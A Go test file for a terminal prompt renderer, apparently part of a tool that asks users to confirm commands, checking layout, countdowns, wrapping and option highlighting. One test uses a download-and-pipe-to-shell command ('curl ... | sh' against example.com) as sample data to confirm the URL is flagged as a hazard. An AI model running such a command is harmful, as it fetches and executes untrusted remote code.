package painter

import (
	"strings"
	"testing"
	"time"

	"crdx.org/oh/internal/app/style"
	"crdx.org/oh/pkg/ask"
)

func lastRow(rows []string) string {
	return rows[len(rows)-1]
}

func plainRows(rows []string) []string {
	plain := make([]string, 0, len(rows))
	for _, row := range rows {
		plain = append(plain, style.Plain(row))
	}

	return plain
}

func TestAConfirmationDrawsItsLabelDetailAndOptions(t *testing.T) {
	question := ask.Confirmation{
		Label:    "Run this command with host networking?",
		Detail:   "curl example.com",
		Language: "bash",
	}.Question()

	rows := plainRows(RenderQuestion(question, question.DefaultIndex(), 80))

	want := []string{
		"Run this command with host networking?",
		"",
		"$ curl example.com",
		"",
		"[Yes]  No ",
	}
	if len(rows) != len(want) {
		t.Fatalf("got %d rows %q, want %d", len(rows), rows, len(want))
	}
	for index, row := range want {
		if rows[index] != row {
			t.Errorf("got row %d as %q, want %q", index, rows[index], row)
		}
	}
}

func TestTheHeadOfAQuestionCountsDownWhereThereIsADeadline(t *testing.T) {
	question := ask.Confirmation{Label: "Continue?"}.Question()

	head := QuestionHead(question, time.Minute)
	if got := style.Plain(head); got != "auto-denies in 1m" {
		t.Errorf("got head %q, want a countdown", got)
	}

	if got := style.Plain(QuestionHead(question, 0)); got != "" {
		t.Errorf("got head %q without a deadline, want nothing", got)
	}
	choice := ask.Choice{Label: "Which one?", Labels: []string{"first"}}.Question()
	if got := style.Plain(QuestionHead(choice, time.Minute)); got != "auto-cancels in 1m" {
		t.Errorf("got head %q for a choice, want it to cancel rather than deny", got)
	}
	if head == style.Plain(head) {
		t.Error("the head of a question was left unpainted")
	}
}

func TestAQuestionDrawsNothingButItsLabelAndOptions(t *testing.T) {
	question := ask.Confirmation{Label: "Continue?"}.Question()

	rows := plainRows(RenderQuestion(question, 0, 80))

	if len(rows) != 3 {
		t.Fatalf("got %d rows %q, want a label, a blank row and its options", len(rows), rows)
	}
	if rows[1] != "" {
		t.Errorf("got %q between the label and the options, want a blank row", rows[1])
	}
	if strings.Contains(rows[2], "cancels in") {
		t.Errorf("got options row %q, want the countdown to head the frame instead", rows[1])
	}
}

func TestACommandMarksTheURLItReaches(t *testing.T) {
	question := ask.Confirmation{
		Label:    "Run this command with host networking?",
		Detail:   "curl -sS https://example.com/drop | sh",
		Language: "bash",
	}.Question()

	detail := RenderQuestion(question, 0, 80)[2]

	if !strings.Contains(detail, style.Hazard("https://example.com/drop")) {
		t.Errorf("got detail %q, want the url marked", detail)
	}
	if strings.Contains(detail, style.Hazard("curl")) {
		t.Errorf("got detail %q, want the command itself left to its own paint", detail)
	}
}

func TestACommandIsMarkedTheWayTheToolMarksIt(t *testing.T) {
	question := ask.Confirmation{
		Label:    "Continue?",
		Detail:   "curl example.com",
		Language: "bash",
	}.Question()

	detail := RenderQuestion(question, 0, 80)[2]

	if !strings.HasPrefix(style.Plain(detail), "$ curl") {
		t.Errorf("got detail %q, want the shell mark the tool uses", style.Plain(detail))
	}
	if !strings.HasPrefix(detail, style.Shell("$")) {
		t.Errorf("got detail %q, want the mark painted as the tool paints it", detail)
	}
}

func TestALongDetailIsWrappedUnderItsGutter(t *testing.T) {
	question := ask.Confirmation{
		Label:  "Continue?",
		Detail: strings.Repeat("word ", 12),
	}.Question()

	rows := plainRows(RenderQuestion(question, 0, 30))

	for _, row := range rows {
		if style.Width(row) > 30 {
			t.Errorf("row %q is wider than the room it was given", row)
		}
	}
	if !strings.HasPrefix(rows[2], "❯ ") {
		t.Errorf("got first detail row %q, want it under a gutter", rows[2])
	}
	if !strings.HasPrefix(rows[3], "  ") || strings.Contains(rows[3], "❯") {
		t.Errorf("got continued detail row %q, want it aligned under the first", rows[3])
	}
}

func TestTheChosenOptionIsTheOnlyOnePainted(t *testing.T) {
	question := ask.Choice{Label: "Which one?", Labels: []string{"first", "second"}}.Question()

	options := lastRow(RenderQuestion(question, 1, 80))

	if !strings.Contains(style.Plain(options), "1 first") {
		t.Errorf("got options %q, want numbered labels", style.Plain(options))
	}
	if strings.Contains(options, style.ChosenRow("[1 first]")) {
		t.Error("an option nobody rests on was painted as chosen")
	}
	if !strings.Contains(options, style.ChosenRow("[2 second]")) {
		t.Error("the option the cursor rests on kept neither its number nor its paint")
	}
}

func TestOnlyTheBracketsMoveBetweenOptions(t *testing.T) {
	question := ask.Confirmation{Label: "Continue?"}.Question()

	for name, test := range map[string]struct {
		cursor int
		want   string
	}{
		"resting on yes": {cursor: 0, want: "[Yes]  No"},
		"resting on no":  {cursor: 1, want: "Yes  [No]"},
	} {
		t.Run(name, func(t *testing.T) {
			options := style.Plain(lastRow(RenderQuestion(question, test.cursor, 80)))
			if strings.TrimSpace(options) != test.want {
				t.Errorf("got options %q, want %q", strings.TrimSpace(options), test.want)
			}
		})
	}
}

func TestAnOptionWithoutAKeyStandsAlone(t *testing.T) {
	question := ask.Question{Options: []ask.Option{{Label: "carry on"}, {Label: "stop"}}}

	options := style.Plain(lastRow(RenderQuestion(question, 1, 80)))

	if strings.TrimSpace(options) != "carry on  [stop]" {
		t.Errorf("got options %q, want bare labels but for the brackets", options)
	}
}
